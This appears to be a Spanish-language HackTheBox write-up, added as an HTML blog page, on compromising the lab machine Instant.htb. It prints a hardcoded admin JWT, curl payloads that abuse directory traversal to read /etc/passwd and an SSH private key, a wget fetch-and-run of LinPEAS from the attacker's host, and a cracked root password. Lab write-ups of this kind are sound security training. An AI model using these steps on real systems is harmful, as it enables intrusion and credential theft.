@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WriteUp: Explotación de Instant.htb (HackTheBox) — Joaquin Silvagni</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav>
+        <a class="nav-logo" href="../index.html"><span>~/</span>zsodex</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#ejpt">Cert</a></li>
+            <li><a href="../index.html#blog">Blog</a></li>
+            <li><a href="../index.html#proyectos">Proyectos</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../index.html#contacto">Contacto</a></li>
+        </ul>
+    </nav>
+
+    <div class="post-page" style="display:block">
+        <a class="pb" href="../index.html#blog">&larr; Volver al blog</a>
+        <div class="pc2">
+            <div class="ph2">
+                <div class="pm">
+                    <span class="cat-badge" style="background:rgba(163,230,53,.1);color:#a3e635;border:1px solid rgba(163,230,53,.25)">HackTheBox</span>
+                    <span class="pdate">2025-03-29</span>
+                </div>
+                <h1 class="ph1">WriteUp: Explotación de Instant.htb (HackTheBox)</h1>
+                <p class="psum">Análisis de APK Android para extraer JWT hardcodeado, explotación de LFI en API REST para obtener clave SSH privada, y escalada vía descifrado de Solar Putty backup.</p>
+                <div class="ptr">
+                    <span class="tag">APK Analysis</span>
+                    <span class="tag">JWT</span>
+                    <span class="tag">LFI</span>
+                    <span class="tag">SSH</span>
+                </div>
+            </div>
+            <div class="post-content">
+                <p>En este WriteUp, detallaré cómo logré comprometer la máquina Instant.htb en HackTheBox, desde la enumeración inicial hasta la escalada de privilegios.</p>
+
+                <p><strong>Autor:</strong> zSodex<br>
+                <strong>Dificultad:</strong> Medium</p>
+
+                <p><strong>Técnicas Clave:</strong></p>
+                <ul>
+                    <li><strong>Enumeración</strong> → Nmap, Fuzzing, Análisis de APK</li>
+                    <li><strong>Explotación</strong> → LFI, JWT, API Abuse</li>
+                    <li><strong>Post-Explotación</strong> → Manipulación de claves SSH</li>
+                    <li><strong>PrivEsc</strong> → Descifrado de credenciales en backups</li>
+                </ul>
+
+                <h2>1. Enumeración Inicial</h2>
+
+                <p>Escaneo con Nmap:</p>
+
+                <pre><code>nmap -sCV 10.10.11.37 -T5 -PN</code></pre>
+
+                <p>Observaciones:</p>
+                <ul>
+                    <li><strong>Puerto 22 (SSH):</strong> OpenSSH en Ubuntu</li>
+                    <li><strong>Puerto 80 (HTTP):</strong> Servidor Apache con redirección a <code>instant.htb</code></li>
+                </ul>
+
+                <p>Configuración de <code>/etc/hosts</code>:</p>
+
+                <pre><code>echo "10.10.11.10 instant.htb" | sudo tee -a /etc/hosts</code></pre>
+
+                <h2>2. Análisis del Servicio Web</h2>
+
+                <p>Al acceder a <code>http://instant.htb</code>, encontré una página de una wallet digital que permitía descargar una aplicación Android (<code>instant.apk</code>).</p>
+
+                <h3>Enumeración de Directorios y Subdominios:</h3>
+
+                <pre><code>gobuster dir -u http://instant.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+
+                <p>No encontré nada relevante por esta vía.</p>
+
+                <h3>Descarga y Análisis del APK:</h3>
+
+                <pre><code>apktool d instant.apk</code></pre>
+
+                <p>Dentro de los archivos extraídos, revisé <code>res/xml/</code> y encontré dos subdominios interesantes. Los agregué a <code>/etc/hosts</code>:</p>
+
+                <pre><code>echo "10.10.11.10 mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts</code></pre>
+
+                <h2>3. Explotación de la API (Swagger UI)</h2>
+
+                <p>El subdominio <code>swagger-ui.instant.htb</code> exponía una API documentada con Swagger. Las funcionalidades eran limitadas sin permisos de administrador.</p>
+
+                <h3>Búsqueda de Credenciales en el APK:</h3>
+
+                <pre><code>grep -r -i "admin" .</code></pre>
+
+                <p>En <code>smali/com/instantlabs/instant/AdminActivities.smali</code> encontré un JWT válido:</p>
+
+                <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA</code></pre>
+
+                <h3>Explotación del LFI (Local File Inclusion):</h3>
+
+                <p>La API tenía un endpoint <code>/admin/read/log</code> vulnerable a directory traversal:</p>
+
+<pre><code>curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2Fetc%2Fpasswd" \
+  -H "accept: application/json" \
+  -H "Authorization: JWT TOKEN"</code></pre>
+
+                <h3>Obtención de la Clave SSH:</h3>
+
+<pre><code>curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" \
+  -H "accept: application/json" \
+  -H "Authorization: JWT TOKEN"</code></pre>
+
+                <p>Procesamiento de la clave:</p>
+
+<pre><code>sed 's/\n//g' clave.txt > clave_limpia.txt
+sed 's/[",]//g' clave_limpia.txt > clave_lim.txt
+
+echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa
+cat clave_lim.txt | fold -w 70 >> id_rsa
+echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa</code></pre>
+
+                <p>Acceso por SSH:</p>
+
+<pre><code>chmod 600 id_rsa
+ssh shirohige@instant.htb -i id_rsa</code></pre>
+
+                <h2>4. Escalada de Privilegios</h2>
+
+                <h3>Enumeración con LinPEAS:</h3>
+
+<pre><code>wget http://&lt;mi_ip&gt;/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh</code></pre>
+
+                <p>Hallazgo clave: un backup encriptado en <code>/opt/backups</code>.</p>
+
+                <h3>Descifrado del Backup — Solar Putty:</h3>
+
+                <pre><code>python3 SolarPuttyDecryptor.py sessions-backup.dat rockyou.txt</code></pre>
+
+                <p>Contraseña obtenida: <code>12**24nzC!r0c%q12</code></p>
+
+                <p>Acceso como Root:</p>
+
+<pre><code>su - root
+Password: 12**24nzC!r0c%q12
+
+cat /root/root.txt
+# ¡Máquina comprometida!</code></pre>
+
+                <h2>Conclusión</h2>
+
+                <p>Este desafío combinó análisis de APK, explotación de APIs, LFI y descifrado de credenciales.</p>
+
+                <p><strong>Lecciones aprendidas:</strong></p>
+                <ul>
+                    <li>Siempre revisar archivos ocultos en aplicaciones móviles.</li>
+                    <li>Validar permisos en endpoints de APIs.</li>
+                    <li>No almacenar credenciales en backups sin cifrado fuerte.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <footer><span>&copy; 2025 <span class="fa">Joaquin Silvagni</span> &middot; zSodex</span><span>Built with &#x1F5A4; &middot; GitHub Pages</span></footer>
+</body>
+</html>
